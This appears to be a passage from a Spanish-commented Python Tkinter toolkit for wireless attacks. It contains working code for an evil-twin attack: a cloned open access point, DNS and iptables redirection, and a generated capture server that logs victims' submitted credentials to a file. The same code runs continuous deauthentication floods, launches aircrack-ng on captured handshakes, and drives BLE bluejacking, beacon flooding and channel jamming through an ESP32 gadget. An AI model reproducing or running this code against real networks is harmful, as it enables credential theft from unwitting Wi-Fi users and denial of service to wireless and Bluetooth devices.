            ttk.Label(self.main_frame, text="No hay portales.", style='Dark.TLabel').pack()
            return
        # mostramos primeros 4
        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for portal in sorted(portales)[:4]:
            if os.path.isfile(os.path.join(portals_dir, portal, "index.html")):
                ttk.Button(frame, text=portal, style='Red.TButton',
                           command=lambda p=portal: self._evil_twin_seleccionar_deauth_mode(red, p)).pack(fill='x', pady=1)
        self.mostrar_consola()
        gc.collect()

    def _evil_twin_seleccionar_deauth_mode(self, red, portal):
        self.wifi_state["portal_name"] = portal
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_portal(red))
        ttk.Label(self.main_frame, text="MODO DEAUTH", style='Title.TLabel').pack(pady=2)
        ttk.Button(self.main_frame, text="Broadcast", style='Danger.TButton',
                   command=lambda: self._evil_twin_ejecutar(red, portal, "broadcast")).pack(fill='x', padx=10, pady=2)
        ttk.Button(self.main_frame, text="Dirigido", style='Red.TButton',
                   command=lambda: self._evil_twin_escanear_clientes(red, portal)).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _evil_twin_escanear_clientes(self, red, portal):
        mon = self.wifi_state.get("mon_deauth")
        scan_prefix = self._generar_nombre_temporal("evil_clients")
        subprocess.run(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]: clientes.append(c[0].strip())
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try: os.remove(f"{scan_prefix}{ext}")
                except: pass

        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(red, portal))
        ttk.Label(self.main_frame, text="CLIENTES", style='Title.TLabel').pack(pady=2)
        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for mac in clientes[:4]:  # máx 4
            ttk.Button(frame, text=mac, style='Gray.TButton',
                       command=lambda m=mac: self._evil_twin_ejecutar(red, portal, "directed", m)).pack(fill='x', pady=1)
        self.mostrar_consola()
        gc.collect()

    def _evil_twin_ejecutar(self, red, portal, deauth_mode, cliente_mac=None):
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        session_dir = os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}")
        os.makedirs(session_dir, exist_ok=True)

        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="EVIL TWIN ACTIVO", style='Title.TLabel').pack(pady=2)
        ttk.Button(self.main_frame, text="DETENER ATAQUE", style='Danger.TButton',
                   command=self._evil_twin_detener).pack(pady=5, fill='x', padx=10)
        self.mostrar_consola()

        self.evil_twin_stop = False

        def ataque():
            self._evil_twin_limpiar_procesos()
            ap_iface = self.wifi_state["ap_iface"]
            deauth_iface = self.wifi_state.get("deauth_iface")
            mon_deauth = self.wifi_state.get("mon_deauth")

            if not mon_deauth:
                subprocess.run(["sudo", "airmon-ng", "start", deauth_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                mon_deauth = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
                self.wifi_state["mon_deauth"] = mon_deauth

            portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
            tmp_web = f"/tmp/evil_twin_web_{timestamp}"
            os.makedirs(tmp_web, exist_ok=True)
            subprocess.run(["cp", "-r", f"{portals_dir}/{portal}/.", tmp_web], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            cred_log = os.path.join(session_dir, "credentials.log")
            capture_script = f'''#!/usr/bin/env python3
import http.server, urllib.parse, os, socketserver
from datetime import datetime
LOG = "{cred_log}"

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html": self.path = "/index.html"
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(data)
        with open(LOG, "a") as f: f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} Data:{{params}}\\n")
        self.send_response(302); self.send_header("Location", "/success.html"); self.end_headers()
    def log_message(self, format, *args): pass

if __name__ == "__main__":
    os.chdir("{tmp_web}")
    with socketserver.TCPServer(("0.0.0.0", 80), Handler) as httpd: httpd.serve_forever()
'''
            with open(f"{tmp_web}/capture.py", "w") as f: f.write(capture_script)
            if not os.path.exists(f"{tmp_web}/success.html"):
                with open(f"{tmp_web}/success.html", "w") as f: f.write('<html><body><h2>OK</h2></body></html>')

            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
            with open("/tmp/hostapd_evil.conf", "w") as f: f.write(hostapd_conf)
            self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)

            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)

            dnsmasq_conf = f"interface={ap_iface}\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
            with open("/tmp/dnsmasq_evil.conf", "w") as f: f.write(dnsmasq_conf)
            self.evil_twin_procs['dnsmasq'] = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                                                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)

            subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)

            self.evil_twin_procs['capture'] = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
                                                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

            subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
            if deauth_mode == "directed" and cliente_mac:
                deauth_cmd.extend(["-c", cliente_mac])
            deauth_cmd.append(mon_deauth)
            self.evil_twin_procs['deauth'] = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            last_lines = 0
            while not self.evil_twin_stop:
                time.sleep(2)
                if os.path.exists(cred_log):
                    with open(cred_log, "r") as f:
                        lines = f.readlines()
                        if len(lines) > last_lines:
                            for line in lines[last_lines:]:
                                self.escribir_consola(f"[+] Cred: {line.strip()}")
                            last_lines = len(lines)

            self._evil_twin_detener_procesos()
            self._evil_twin_limpiar_iptables(ap_iface)
            self.escribir_consola("[+] Evil Twin detenido.")

        self.evil_twin_thread = threading.Thread(target=ataque, daemon=True)
        self.evil_twin_thread.start()

    def _evil_twin_detener(self):
        self.evil_twin_stop = True

    def _evil_twin_detener_procesos(self):
        for nombre, proc in self.evil_twin_procs.items():
            if proc is not None:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except:
                    proc.kill()
                self.evil_twin_procs[nombre] = None

    def _evil_twin_limpiar_procesos(self):
        self._evil_twin_detener_procesos()
        subprocess.run(["sudo", "pkill", "-f", "hostapd.*evil"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "-f", "dnsmasq.*evil"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "-f", "capture.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _evil_twin_limpiar_iptables(self, ap_iface):
        subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
        if ap_iface:
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)

    def _wifi_deauth(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="DEAUTH - IFace", style='Title.TLabel').pack(pady=2)
        for iface in self.obtener_interfaces_red():
            ttk.Button(self.main_frame, text=iface, style='Red.TButton',
                       command=lambda i=iface: self._deauth_escanear(i)).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _deauth_escanear(self, iface):
        self.wifi_state = {"iface": iface}
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
        self.wifi_state["mon_iface"] = mon
        scan_prefix = self._generar_nombre_temporal("deauth_scan")
        subprocess.run(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        redes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                for linea in f.read().split("\n")[2:]:
                    r = linea.split(",")
                    if len(r) >= 14 and ":" in r[0]:
                        redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() or "<Oculta>"})
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try: os.remove(f"{scan_prefix}{ext}")
                except: pass
        self.after(0, lambda: self._deauth_mostrar_redes(redes))

    def _deauth_mostrar_redes(self, redes, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ttk.Label(self.main_frame, text="SELECCIONA RED", style='Title.TLabel').pack(pady=2)
        if not redes:
            ttk.Label(self.main_frame, text="No hay redes.", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(redes) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(redes))
        page_redes = redes[start:end]
        self._deauth_redes = redes
        self._deauth_page = page

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for red in page_redes:
            texto = f"{red['essid']} (CH:{red['ch']})"
            ttk.Button(frame, text=texto, style='Gray.TButton',
                       command=lambda r=red: self._deauth_seleccionar_modo(r)).pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._deauth_mostrar_redes(self._deauth_redes, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._deauth_mostrar_redes(self._deauth_redes, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _deauth_seleccionar_modo(self, red):
        self.wifi_state["target"] = red
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ttk.Label(self.main_frame, text="MODO DE ATAQUE", style='Title.TLabel').pack(pady=2)
        ttk.Button(self.main_frame, text="Broadcast (Todos)", style='Danger.TButton',
                   command=lambda: self._deauth_ejecutar("FF:FF:FF:FF:FF:FF")).pack(fill='x', padx=10, pady=2)
        ttk.Button(self.main_frame, text="Cliente específico", style='Red.TButton',
                   command=lambda: self._deauth_escanear_clientes(red)).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _deauth_escanear_clientes(self, red):
        mon = self.wifi_state["mon_iface"]
        scan_prefix = self._generar_nombre_temporal("deauth_clients")
        subprocess.run(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]: clientes.append(c[0].strip())
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try: os.remove(f"{scan_prefix}{ext}")
                except: pass
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._deauth_seleccionar_modo(red))
        ttk.Label(self.main_frame, text="SELECCIONA CLIENTE", style='Title.TLabel').pack(pady=2)
        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for mac in clientes[:4]:  # máximo 4
            ttk.Button(frame, text=mac, style='Gray.TButton',
                       command=lambda m=mac: self._deauth_ejecutar(m)).pack(fill='x', pady=1)
        self.mostrar_consola()
        gc.collect()

    def _deauth_ejecutar(self, cliente):
        red = self.wifi_state["target"]
        mon = self.wifi_state["mon_iface"]
        subprocess.run(["sudo", "iw", "dev", mon, "set", "channel", red['ch']], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ttk.Label(self.main_frame, text="INTENSIDAD", style='Title.TLabel').pack(pady=2)
        for texto, count in [("Continuo (0)", "0"), ("1 ráfaga (5)", "5"), ("3 ráfagas (15)", "15")]:
            ttk.Button(self.main_frame, text=texto, style='Red.TButton',
                       command=lambda c=count: self.ejecutar_comando(
                           f"sudo aireplay-ng --deauth {c} -a {red['bssid']} -c {cliente} {mon}"
                       )).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _wifi_explorar_handshakes(self):
        self._mostrar_explorador_generico(BASE_DIR_WIFI, "CAPTURAS", self.show_wifi_menu)

    def _wifi_explorar_evil(self):
        self._mostrar_explorador_generico(BASE_DIR_EVIL, "EVIL TWIN RES", self.show_wifi_menu)

    def _mostrar_explorador_generico(self, base_dir, titulo, callback_volver, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(callback_volver)
        ttk.Label(self.main_frame, text=titulo, style='Title.TLabel').pack(pady=2)
        if not os.path.exists(base_dir): os.makedirs(base_dir)
        carpetas = sorted([d for d in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, d))], reverse=True)
        if not carpetas:
            ttk.Label(self.main_frame, text="No hay registros.", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(carpetas) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(carpetas))
        page_carpetas = carpetas[start:end]
        self._explorador_list = carpetas
        self._explorador_page = page
        self._explorador_base = base_dir
        self._explorador_volver = callback_volver

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for carpeta in page_carpetas:
            ruta = os.path.join(base_dir, carpeta)
            ttk.Button(frame, text=carpeta, style='Gray.TButton',
                       command=lambda r=ruta: self._mostrar_archivos_generico(r, callback_volver)).pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._mostrar_explorador_generico(base_dir, titulo, callback_volver, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._mostrar_explorador_generico(base_dir, titulo, callback_volver, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _mostrar_archivos_generico(self, ruta, callback_volver, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._mostrar_explorador_generico(os.path.dirname(ruta), "", callback_volver, self._explorador_page))
        nombre = os.path.basename(ruta)
        ttk.Label(self.main_frame, text=nombre, style='Title.TLabel').pack(pady=2)
        archivos = sorted([f for f in os.listdir(ruta) if os.path.isfile(os.path.join(ruta, f))])
        if not archivos:
            ttk.Label(self.main_frame, text="Carpeta vacía", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(archivos) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(archivos))
        page_files = archivos[start:end]
        self._explorador_files = archivos
        self._explorador_files_page = page
        self._explorador_files_ruta = ruta

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for archivo in page_files:
            ruta_arch = os.path.join(ruta, archivo)
            if archivo.endswith('.cap'):
                btn = ttk.Button(frame, text=archivo, style='Gray.TButton',
                                 command=lambda ra=ruta_arch: self.ejecutar_comando(f"aircrack-ng '{ra}'"))
            else:
                btn = ttk.Button(frame, text=archivo, style='Gray.TButton',
                                 command=lambda ra=ruta_arch: self.ejecutar_comando(f"cat '{ra}'"))
            btn.pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._mostrar_archivos_generico(ruta, callback_volver, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._mostrar_archivos_generico(ruta, callback_volver, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    # ==========================================
    # MENÚ BLUETOOTH BLE (lazy import de gadget)
    # ==========================================
    def _init_gadget(self):
        if self._gadget_initialized:
            return
        self._gadget_initialized = True
        try:
            from gadget_handler import BLEGadget
            self.gadget = BLEGadget()
            if self.gadget.is_available():
                self.gadget_available = True
                self.escribir_consola("[+] Gadget ESP32 BLE conectado correctamente.")
            else:
                self.gadget_available = False
                self.escribir_consola("[!] Gadget ESP32 BLE no detectado.")
        except Exception as e:
            self.gadget = None
            self.gadget_available = False
            self.escribir_consola(f"[!] Error al inicializar gadget BLE: {e}")

    def show_bluetooth_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="AUDITORÍA BLUETOOTH", style='Title.TLabel').pack(pady=2)

        self._init_gadget()
        gadget_status = "Conectado" if self.gadget_available else "Desconectado"
        status_color = "#00ff00" if self.gadget_available else "#ff4d4d"
        status_label = ttk.Label(self.main_frame, text=f"Gadget: {gadget_status}",
                                 foreground=status_color, font=('Helvetica', 9))
        status_label.pack(pady=2)

        btn_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        btn_frame.pack(fill='x', padx=5, pady=2)

        if self.gadget_available:
            opciones = [
                ("Scan BLE (HSPI)", lambda: self._ble_scan_gadget(0)),
                ("Scan BLE (VSPI)", lambda: self._ble_scan_gadget(1)),
                ("Bluejacking", self._bluejacking_gui),
                ("Beacon Flood", self._beacon_flood_gui),
                ("Jammer", self._jammer_gui),
                ("Barrido Jammer", self._sweep_jammer_gui),
                ("Detener Gadget", self._gadget_stop_all),
                ("Estado Gadget", self._gadget_status)
            ]
        else:
            opciones = [("Scan Dispositivos BLE", self._ble_escanear)]
        for text, cmd in opciones:
            style = 'Danger.TButton' if "Detener" in text else 'Red.TButton'
            ttk.Button(btn_frame, text=text, style=style, command=cmd, width=26).pack(fill='x', pady=1)

        ttk.Button(self.main_frame, text="Explorar Resultados", style='Gray.TButton',
                   command=lambda: self._mostrar_explorador_generico(BASE_DIR_BLE, "RESULTADOS BLE", self.show_bluetooth_menu)
                   ).pack(fill='x', padx=10, pady=3)
        self.mostrar_consola()

    def _ble_scan_gadget(self, module):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ttk.Label(self.main_frame, text=f"ESCANEANDO (MOD {module})...", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()
        def callback(devices):
            self.after(0, lambda: self._ble_gadget_mostrar_dispositivos(devices, module))
        self.gadget.scan(module, 10, callback)

    def _ble_gadget_mostrar_dispositivos(self, dispositivos, module, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ttk.Label(self.main_frame, text="DISPOSITIVOS (Gadget)", style='Title.TLabel').pack(pady=2)
        if not dispositivos:
            ttk.Label(self.main_frame, text="No se encontraron.", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(dispositivos) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(dispositivos))
        page_devs = dispositivos[start:end]
        self._ble_gadget_devices = dispositivos
        self._ble_gadget_page = page

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for dev in page_devs:
            texto = f"{dev['name'][:15]} ({dev['mac']})"
            ttk.Button(frame, text=texto, style='Gray.TButton',
                       command=lambda d=dev: self._ble_acciones(d)).pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._ble_gadget_mostrar_dispositivos(dispositivos, module, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._ble_gadget_mostrar_dispositivos(dispositivos, module, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _bluejacking_gui(self):
        msg = simpledialog.askstring("Bluejacking", "Mensaje advertising:")
        if msg:
            self.gadget.advertise(0, msg)
            self.limpiar_main_frame()
            self.agregar_boton_atras(self.show_bluetooth_menu)
            ttk.Label(self.main_frame, text="Publicidad activa.", style='Title.TLabel').pack(pady=5)
            ttk.Button(self.main_frame, text="Detener", style='Danger.TButton',
                       command=lambda: self.gadget.stop(0)).pack(pady=5)
            self.mostrar_consola()

    def _beacon_flood_gui(self):
        count = simpledialog.askinteger("Flood", "Beacons:")
        if not count: return
        interval = simpledialog.askinteger("Flood", "Intervalo(ms):")
        if not interval: return
        self.gadget.beacon_flood(0, count, interval)
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ttk.Label(self.main_frame, text="Flood en curso...", style='Title.TLabel').pack(pady=5)
        ttk.Button(self.main_frame, text="Detener", style='Danger.TButton',
                   command=lambda: self.gadget.stop(0)).pack(pady=5)
        self.mostrar_consola()

    def _jammer_gui(self):
        ch_str = simpledialog.askstring("Jammer", "Canal(0-78):")
        if not ch_str: return
        dur_str = simpledialog.askstring("Jammer", "Segundos:")
        if not dur_str: return
        self.gadget.jam(0, int(ch_str), int(dur_str))
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ttk.Label(self.main_frame, text=f"Jamming canal {ch_str}", style='Title.TLabel').pack(pady=5)
        ttk.Button(self.main_frame, text="Detener", style='Danger.TButton',
                   command=lambda: self.gadget.stop(0)).pack(pady=5)
        self.mostrar_consola()

    def _sweep_jammer_gui(self):
        dur_str = simpledialog.askstring("Barrido", "Segundos:")
        if not dur_str: return
        self.gadget.sweep_jam(0, int(dur_str))
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ttk.Label(self.main_frame, text="Barrido activo", style='Title.TLabel').pack(pady=5)
        ttk.Button(self.main_frame, text="Detener", style='Danger.TButton',
                   command=lambda: self.gadget.stop(0)).pack(pady=5)
        self.mostrar_consola()

    def _gadget_stop_all(self):
        self.gadget.stop(0)
        self.gadget.stop(1)

    def _gadget_status(self):
        if self.gadget_available:
            self.escribir_consola(f"[+] Estado gadget: {self.gadget.status()}")

    def _ble_escanear(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ttk.Label(self.main_frame, text="ESCANEANDO BLE...", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()
        def escanear():
            subprocess.run(["sudo", "hciconfig", "hci0", "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("sudo bluetoothctl scan on &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(12)
            subprocess.run(["sudo", "bluetoothctl", "scan", "off"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            dispositivos = []
            try:
                output = subprocess.check_output("sudo bluetoothctl devices", shell=True, text=True)
                for line in output.splitlines():
                    if "Device" in line:
                        parts = line.strip().split(' ', 2)
                        if len(parts) >= 3: dispositivos.append({"mac": parts[1], "nombre": parts[2]})
            except: pass
            self.after(0, lambda: self._mostrar_dispositivos_ble(dispositivos))
        threading.Thread(target=escanear, daemon=True).start()

    def _mostrar_dispositivos_ble(self, dispositivos, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ttk.Label(self.main_frame, text="DISPOSITIVOS BLE", style='Title.TLabel').pack(pady=2)
        if not dispositivos:
            ttk.Label(self.main_frame, text="No se encontraron.", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(dispositivos) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(dispositivos))
        page_devs = dispositivos[start:end]
        self._ble_devices = dispositivos
        self._ble_page = page

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for dev in page_devs:
            texto = f"{dev['nombre'][:15]} ({dev['mac']})"
            ttk.Button(frame, text=texto, style='Gray.TButton',
                       command=lambda d=dev: self._ble_conectar_legacy(d['mac'])).pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._mostrar_dispositivos_ble(dispositivos, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._mostrar_dispositivos_ble(dispositivos, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _ble_conectar_legacy(self, mac):
        self.escribir_consola(f"[*] Conectando a {mac}...")
        def conectar():
            try:
                subprocess.run(f"sudo bluetoothctl pair {mac}", shell=True, timeout=30)
                subprocess.run(f"sudo bluetoothctl connect {mac}", shell=True, timeout=30)
                self.escribir_consola(f"[+] Conectado a {mac}")
